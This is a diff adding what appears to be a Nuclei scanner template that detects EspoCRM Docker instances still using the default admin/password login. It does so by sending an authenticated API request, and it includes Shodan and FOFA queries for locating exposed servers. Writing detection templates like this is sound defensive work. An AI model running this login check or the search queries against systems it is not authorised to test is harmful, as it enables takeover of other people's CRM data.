@@ -1,0 +1,52 @@
+id: espocrm-default-login
+
+info:
+  name: EspoCRM - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    The official EspoCRM Docker image creates the administrator account admin with the password password on first start when ESPOCRM_ADMIN_USERNAME and ESPOCRM_ADMIN_PASSWORD are not set. An attacker who logs in with these credentials gains full administrative control over the CRM, including all accounts, contacts, leads, opportunities, emails, users, roles, API users and system settings.
+  reference:
+    - https://docs.espocrm.com/administration/docker/installation/
+    - https://github.com/espocrm/espocrm-docker/blob/10.1.4/docker-entrypoint.sh
+    - https://github.com/espocrm/espocrm-docker/blob/10.1.4/README.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:espocrm:espocrm:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: espocrm
+    product: espocrm
+    shodan-query: html:"Powered by EspoCRM"
+    fofa-query: body="Powered by EspoCRM"
+  tags: espocrm,default-login,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/App/user"
+
+    headers:
+      Espo-Authorization: "{{base64(username + ':' + password)}}"
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - password
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"userName\":\"admin\"", "\"type\":\"admin\"", "\"acl\":{\"table\":", "\"appParams\":")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
